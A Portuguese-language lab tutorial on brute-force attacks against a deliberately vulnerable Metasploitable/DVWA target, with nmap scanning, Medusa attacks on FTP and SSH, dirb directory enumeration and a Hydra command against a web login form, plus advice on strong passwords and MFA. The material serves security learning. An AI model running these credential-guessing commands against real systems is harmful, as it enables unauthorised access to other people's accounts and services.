# Ataques de força bruta

Ataque de força bruta é uma tecnica de ciberataque que usa tentativa e erro para descobrir senhas chaves de criptografias ou credenciais de login tentando todas as combinações possiveis até encontrar a correta.
A eficiencia do ataque depende da complexidade da senha. 
Senhas muito complexas e muito grande se torna enviavel um ataque de força bruta.

Com isso, as melhores formas de se proteger contra ataques de força bruta é usar senhas fortes juntamente com um MFA. 

----------------------------------------------------------------------------------------------
### --ATENÇÃO--

`OS COMANDOS E TECNICAS APRESENTADOS AQUI SÃO REALIZADOS EM AMBIENTE CONTROLADO E VULNERAVEL PARA TESTES. QUALQUER TESTES REALIZADOS FORA DE UM CENARIO CONTROLADO É POR SUA CONTA E RISCO.`

----------------------------------------------------------------------------------------------

Usaremos  o sistema Metasploitable Para simular um ambiente em que faremos os ataques.

Simulando um ambiente real e vulnerável, suponhamos que de alguma forma através de alguma técnica descobrimos o IP do nosso alvo.

### SCANEANDO PORTAS E SERVIÇO USANDO O NMAP

Usaremos a ferramenta NMAP para reconhecer as portas e verificar os serviços rodando.

**INSTALAÇÃO**

`apt install nmap`

Usando o comando:

`nmap -sV [IP ALVO] > scan.txt`

Será feito o scan e o resultado salvo em um arquivo de texto com o nome scan.txt.

[Foto scan nmap]

Podemos verificar que ha vários serviços rodando e iremos realizar ataques em alguns deles como: ftp.


----


## INSTALANDO O MEDUSA

Caso não esteja usando o Kali linux ou alguma outra distribuição, pode obter com o seguinte comando:

`sudo apt install medusa`

para sistema MAC use o comando:

`brew install medusa`


**BRUTE FORCE FPT USANDO A FERRAMENTA MEDUSA**

Usando uma wordlist de usuarios e uma wordlist de senhas faremos o ataque no serviço FTP com o comando:

`medusa -h [IP DO ALVO] -U [WORDLIST USUARIOS] -P [WORDLIST SENHAS] -X [SERVIÇO] -t[QTD THEADS]`

Nesse cenário fizemos um brute force no serviço de FTP usando wordlists de usuários e senhas e 6 threads.

[foto ataque ftp medusa]

com o resultado de sucesso podemos testar e validar o acesso logando no serviço.

[foto login ftp]

----

**ATAQUE DE LOGIN SSH COM MEDUSA**

Para o brute force  ssh podemos usar o comando:

`medusa -h [IP ALVO] -M ssh -U [WORDLIST USERS] -P [WORDLIST ] -t 6`

[foto ataque ssh]

----

### ENUMERANDO DIRETORIOS

Para enumerar diretórios podemos usar qualquer ferramenta que automatize esse processo para termos mais agilidade.
usaremos o DIRB para enumerar mas tambem poderiamos usar o GOBUSTER

**INSTALANDO O DIRB**

`sudo apt install dirb`

**NSTALANDO O GOBUSTER**

`sudo apt install gobuster`

**ENUMERANDO DIRETÓRIOS COM O DIRB**

`dirb http://[IP DO ALVO]`

[foto enumeração dirb]

----

### ATAQUE DE LOGIN USANDO O HYDRA

Em nosso ambiente de ha uma pagina de login via formulário, faremos um brute force usando o HYDRA.

**INSTALAÇÃO DO HYDRA**

`sudo apt install hydra`

para tal cenário usaremos o comando:

`hydra [IP ALVO] -L [WORDLIST USER] -P [WORDLIST PASS] http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"`

